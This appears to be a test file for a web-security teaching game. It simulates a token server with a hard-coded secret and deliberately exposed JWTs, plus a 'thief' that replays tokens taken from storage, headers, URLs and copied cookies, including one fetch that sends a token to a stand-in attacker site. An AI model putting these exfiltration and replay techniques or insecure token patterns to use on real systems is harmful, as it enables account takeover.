import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { WebSpec } from '../../../../shared/levels/web/backend'
import { WEB_CLOCK } from '../../../../shared/levels/web/cookies'
import { JWT_SOURCE } from '../../../../shared/levels/web/tokens'
import type { JwtModule } from '../../../../shared/levels/web/tokens'
import { nodeBackend } from './helpers'

// The web backend's chapter 3 (ADR 0009, docs/features/levels.md "The web backend"): Web Storage between the page and
// the Application panel, the scripted clock that moves (cookies expire, server.js's tokens run out), and the thief: what
// a script on the page could take, a copy of the browser's cookies, what a sign-in answered earlier, and those sent from
// outside the browser. The very source the bridge runs, on Node with server.js in-process and fake timers.

const API = 'https://api.cornerbakery.shop'
const SHOP = 'https://cornerbakery.shop'
const ATTACKER = 'https://cheap-flour.example'

/** A token server: the login answers the token (in the body, a cookie, or both), /account takes a Bearer token or the cookie. */
const SERVER = `const express = require('express')
const jwt = require('jsonwebtoken')
const cookieParser = require('cookie-parser')
const app = express()
app.use(express.urlencoded())
app.use(cookieParser())
const SHOP = 'https://cornerbakery.shop'
const SECRET = 'oven-mitt-4417'
app.use((req, res, next) => {
  if (req.get('Origin') === SHOP) {
    res.set('Access-Control-Allow-Origin', SHOP)
    res.set('Access-Control-Allow-Credentials', 'true')
  }
  if (req.method === 'OPTIONS') {
    res.set('Access-Control-Allow-Methods', 'GET, POST')
    res.set('Access-Control-Allow-Headers', 'Authorization, X-Token, X-CSRF-Token')
    return res.sendStatus(204)
  }
  next()
})
app.post('/login', (req, res) => {
  if (req.body?.email !== 'lena@example.com') return res.status(401).json({ error: 'Wrong email' })
  const token = jwt.sign({ sub: 'lena' }, SECRET, SIGN_OPTIONS)
  if (MODE !== 'body') res.cookie('session', token, { httpOnly: true, secure: true, sameSite: 'lax', maxAge: 15 * 60 * 1000 })
  res.json(MODE === 'cookie' ? { name: 'Lena' } : { name: 'Lena', token })
})
app.get('/account', (req, res) => {
  const header = (req.get('Authorization') ?? '').replace(/^Bearer /, '')
  const token = header || req.get('X-Token') || req.query.t || req.cookies.session
  try {
    res.json({ name: jwt.verify(token, SECRET).sub })
  } catch (error) {
    res.status(401).json({ error: error.message })
  }
})`

const spec = (extra: Partial<WebSpec> = {}): WebSpec => ({
  api: API,
  server: 'server.js',
  application: true,
  storage: [],
  time: true,
  sites: [{ origin: ATTACKER, title: 'Cheap Flour', role: 'attacker', intro: [], actions: [], hidden: true }],
  ...extra
})
const begin = (mode: 'body' | 'cookie' | 'both', options = '{ expiresIn: \'15m\' }', extra: Partial<WebSpec> = {}) =>
  nodeBackend(spec(extra), { 'server.js': SERVER.replace(/MODE/g, `'${mode}'`).replace('SIGN_OPTIONS', options), 'index.html': '' })

type Made = ReturnType<typeof begin>

/** A Storage.prototype of our own (Node has none): the backend gives the page its objects on it. */
function storageOf(made: Made) {
  const proto = Object.create(Object.prototype) as object
  return made.backend.storage!(proto) as { local: Storage, session: Storage }
}
async function settle<T>(promise: Promise<T>): Promise<T> {
  const outcome = promise.then(value => ({ value }), (error: unknown) => ({ error }))
  await vi.advanceTimersByTimeAsync(2000)
  const result = await outcome
  if ('error' in result) throw result.error
  return result.value
}
const ask = <T>(start: (then: (value: T) => void) => void) => settle(new Promise<T>(resolve => start(resolve)))
const signIn = (made: Made, init: RequestInit = {}) => settle(made.backend.fetch(`${API}/login`, { method: 'POST', credentials: 'include', body: new URLSearchParams({ email: 'lena@example.com' }), ...init }))
const replay = (made: Made, using: string, request = `GET ${API}/account`, show = false) => ask<string | number>(then => made.backend.replay({ replay: request, using, show }, then))

beforeEach(() => {
  vi.useFakeTimers()
})
afterEach(() => {
  vi.useRealTimers()
})

describe('Web Storage in the frame', () => {
  it('gives the page the origin\'s localStorage and sessionStorage, from the level\'s items, and the panel every area', async () => {
    const made = begin('body', undefined, { storage: [{ origin: SHOP, kind: 'local', key: 'cart', value: '2 croissants' }, { origin: API, kind: 'local', key: 'apiToken', value: 'x' }] })
    const { local, session } = storageOf(made)
    expect(local.getItem('cart')).toBe('2 croissants')
    // the API's storage is another origin's: out of the page's reach
    expect(local.getItem('apiToken')).toBeNull()
    session.setItem('draft', 'rye')
    await vi.advanceTimersByTimeAsync(100)
    const last = made.of('storage').at(-1) as unknown as { areas: unknown[], now: number }
    expect(last.now).toBe(WEB_CLOCK)
    // localStorage first, then sessionStorage, each by origin
    expect(last.areas).toEqual([
      { kind: 'local', origin: API, items: [['apiToken', 'x']], count: 1, size: 9 },
      { kind: 'local', origin: SHOP, items: [['cart', '2 croissants']], count: 1, size: 16 },
      { kind: 'session', origin: SHOP, items: [['draft', 'rye']], count: 1, size: 8 }
    ])
  })

  it('has none without the level asking (chapters 1 and 2 are as they were)', () => {
    const made = begin('body', undefined, { storage: undefined, time: undefined })
    expect(made.backend.storage).toBeNull()
    expect(made.backend.date).toBeNull()
  })
})

describe('the scripted clock', () => {
  it('moves with later: the page\'s Date, the cookie\'s Max-Age and server.js\'s exp all tell the new time', async () => {
    const made = begin('cookie')
    await signIn(made)
    const PageDate = made.backend.date!
    expect(new PageDate().toISOString()).toBe('2026-11-17T09:41:00.000Z')
    expect((await settle(made.backend.fetch(`${API}/account`, { credentials: 'include' }))).status).toBe(200)
    made.backend.later(20)
    expect(PageDate.now()).toBe(WEB_CLOCK + 20 * 60_000)
    expect(new PageDate(2020, 0, 1).getFullYear()).toBe(2020)
    // the browser dropped the cookie at 09:56 (Max-Age 15 minutes): nothing goes with the request
    const account = await settle(made.backend.fetch(`${API}/account`, { credentials: 'include' }))
    expect(account.status).toBe(401)
    expect((made.of('request').at(-1) as unknown as { cookies: unknown[] }).cookies).toEqual([])
  })
})

describe('the scripted time on a global', () => {
  it('puts the scripted Date there, as its prototype constructor too, and a timeOrigin that adds up to it', () => {
    // (the real Date: fake timers would hand the backend a fake one)
    vi.useRealTimers()
    const made = begin('cookie')
    const global: Record<string, unknown> = { performance: { now: () => 7 } }
    try {
      made.backend.installTime!(global)
      const PageDate = global.Date as DateConstructor
      expect((new PageDate().constructor as DateConstructor).now()).toBe(WEB_CLOCK)
      expect((global.performance as { timeOrigin: number }).timeOrigin + 7).toBe(WEB_CLOCK)
      made.backend.later(20)
      expect(PageDate.now()).toBe(WEB_CLOCK + 20 * 60_000)
    } finally {
      Object.defineProperty(Date.prototype, 'constructor', { value: Date, writable: true, configurable: true, enumerable: false })
    }
  })
})

describe('the thief', () => {
  it('replays what a script on the page could take: a token in localStorage, under any key, as a Bearer token', async () => {
    const made = begin('body')
    const { local } = storageOf(made)
    // a token the page never fetched (signed as server.js signs it): until it is in the page's storage, a script finds nothing
    const token = (new Function(`return ${JWT_SOURCE}`)()(() => WEB_CLOCK) as { module: JwtModule }).module.sign({ sub: 'lena' }, 'oven-mitt-4417', { expiresIn: '15m' })!
    expect(await replay(made, 'script')).toBe(401)
    local.setItem('k9', JSON.stringify({ auth: { value: token } }))
    expect(await replay(made, 'script')).toBe(200)
    // sessionStorage is as open to it
    local.clear()
    storageOf(made).session.setItem('t', token)
    expect(await replay(made, 'script')).toBe(200)
  })

  it('takes a token the page\'s code only held in memory from the headers it handed to fetch, or the answer it read', async () => {
    const made = begin('both')
    const login = await signIn(made)
    // the login's answer (readable by the page) had the token in its body
    expect(await replay(made, 'script')).toBe(200)
    const kept = begin('cookie')
    const answered = await signIn(kept)
    await answered.json()
    // an HttpOnly cookie: nothing a script could read is a session
    expect(await replay(kept, 'script')).toBe(401)
    // the token in a custom header, or in the address
    const token = ((await login.json()) as { token: string }).token
    await settle(kept.backend.fetch(`${API}/account`, { headers: { 'X-Token': token } }))
    expect(await replay(kept, 'script')).toBe(200)
    const query = begin('cookie')
    await settle(query.backend.fetch(`${API}/account?t=${token}`))
    expect(await replay(query, 'script')).toBe(200)
  })

  it('gets nothing from a CSRF token a script can read beside an HttpOnly session: it is no session by itself', async () => {
    const made = begin('cookie')
    await (await signIn(made)).json()
    made.backend.writeCookie('csrf=t-91c2e; Secure; SameSite=Strict')
    await settle(made.backend.fetch(`${API}/account`, { credentials: 'include', headers: { 'X-CSRF-Token': 't-91c2e' } }))
    // the thief has document.cookie (csrf) and the header the page sent, never the session
    expect(made.backend.documentCookie()).toBe('csrf=t-91c2e')
    expect(await replay(made, 'script')).toBe(401)
  })

  it('replays a copy of the browser\'s cookies (HttpOnly ones too) taken earlier, and keeps the cookies an answer gives it', async () => {
    const made = begin('cookie')
    await signIn(made)
    made.backend.copy('browser', 'library')
    expect(await replay(made, 'library', `GET ${API}/account`, true)).toBe(200)
    const shown = made.of('replay').at(-1) as unknown as { request: string, using: string, status: number, by: string | null }
    expect([shown.request, shown.status, shown.by]).toEqual([`GET ${API}/account`, 200, null])
    expect(shown.using).toMatch(/^cookie: session=eyJ/)
    // twenty minutes on, the copy's token has run out
    made.backend.later(20)
    expect(await replay(made, 'library')).toBe(401)
  })

  it('signs in at an earlier moment (issued): a token with exp is refused later, one without exp never runs out', async () => {
    const expiring = begin('body')
    await ask<undefined>(then => expiring.backend.issued({ issued: `POST ${API}/login`, body: { email: 'lena@example.com' }, ago: 20, as: 'old' }, () => then(undefined)))
    expect(await replay(expiring, 'old')).toBe(401)
    const forever = begin('body', '{}')
    await ask<undefined>(then => forever.backend.issued({ issued: `POST ${API}/login`, body: { email: 'lena@example.com' }, ago: 10080, as: 'old' }, () => then(undefined)))
    expect(await replay(forever, 'old')).toBe(200)
  })

  it('uses what reached another site\'s server (the widget\'s "analytics"), name-blind', async () => {
    const made = begin('body')
    const token = ((await (await signIn(made)).json()) as { token: string }).token
    expect(await replay(made, ATTACKER)).toBe(401)
    await settle(made.backend.fetch(`${ATTACKER}/collect?s=${encodeURIComponent(JSON.stringify({ x: token }))}`, { mode: 'no-cors' }))
    expect(await replay(made, ATTACKER, `GET ${API}/account`, true)).toBe(200)
    expect((made.of('replay').at(-1) as unknown as { by: string }).by).toBe(ATTACKER)
  })
})

describe('fetchFrom with a body', () => {
  it('posts a form as another customer\'s page would', async () => {
    const made = nodeBackend({ api: API, server: 'server.js' }, { 'server.js': `const express = require('express')
const app = express()
app.use(express.urlencoded())
app.post('/reviews', (req, res) => res.status(201).json(req.body))` })
    expect(await ask<string>(then => made.backend.from({ fetchFrom: SHOP, request: `POST ${API}/reviews`, credentials: 'omit', body: { name: 'Sam', text: '<b>hi</b>' } } as never, then))).toBe('blocked')
    expect(made.server.output.map(line => line.text)).toEqual(['POST /reviews 201'])
  })
})
